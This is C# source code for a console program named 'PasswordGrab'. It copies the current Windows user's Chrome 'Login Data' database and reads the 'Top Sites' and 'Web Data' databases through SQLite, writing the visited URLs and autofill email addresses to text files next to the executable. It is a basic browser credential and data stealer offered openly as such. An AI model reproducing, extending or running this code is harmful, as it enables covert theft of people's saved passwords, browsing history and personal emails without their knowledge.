using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Data.SQLite;
using System.Security.Cryptography;



namespace PasswordGrab
{

    class Program
    {
        static void Main(string[] args)
        {

            string userName = Environment.UserName;
            string pathToLogin;
            string[] pathToSave = new string[10];
            string _pathToSave = AppDomain.CurrentDomain.BaseDirectory;

            //PROGRAM
            pathToLogin = "C:/users/" + userName + "/AppData/Local/Google/Chrome/User Data/Default/Login Data";
            pathToSave[0] = Path.Combine(_pathToSave, "Login Data");
            File.Copy(pathToLogin, pathToSave[0], true);

            pathToLogin = "C:/users/" + userName + "/AppData/Local/Google/Chrome/User Data/Default/Top Sites";
            pathToSave[1] = Path.Combine(_pathToSave, "Top Sites.sqlite");
            File.Copy(pathToLogin, pathToSave[1], true);


            SQLiteConnection m_dbConnection = new SQLiteConnection("Data Source=Top Sites.sqlite;Version=3;");
            m_dbConnection.Open();


            pathToSave[2] = Path.Combine(_pathToSave, "Top Sites.txt");
            string sql = "SELECT url FROM thumbnails";
            SQLiteCommand command = new SQLiteCommand(sql, m_dbConnection);
            SQLiteDataReader reader = command.ExecuteReader();


            string[] text = new string[30];

            for (int i = 0; reader.Read(); i++)
            {
                text[i] = reader[0].ToString();
            }

            File.WriteAllLines(pathToSave[2], text);

            


            pathToLogin = "C:/users/" + userName + "/AppData/Local/Google/Chrome/User Data/Default/Web Data";
            pathToSave[3] = Path.Combine(_pathToSave, "Web Data.sqlite");
            File.Copy(pathToLogin, pathToSave[3], true);

            SQLiteConnection _m_dbConnection = new SQLiteConnection("Data Source=Web Data.sqlite;Version=3;");
            _m_dbConnection.Open();


            pathToSave[3] = Path.Combine(_pathToSave, "Web Data.txt");
            sql = "SELECT email FROM autofill_profile_emails";
            SQLiteCommand _command = new SQLiteCommand(sql, _m_dbConnection);
            SQLiteDataReader _reader = _command.ExecuteReader();


            string[] _text = new string[30];

            for (int i = 0; _reader.Read(); i++)
            {
                _text[i] = _reader[0].ToString();
            }

            File.WriteAllLines(pathToSave[3], _text);

            

        }


    }
}
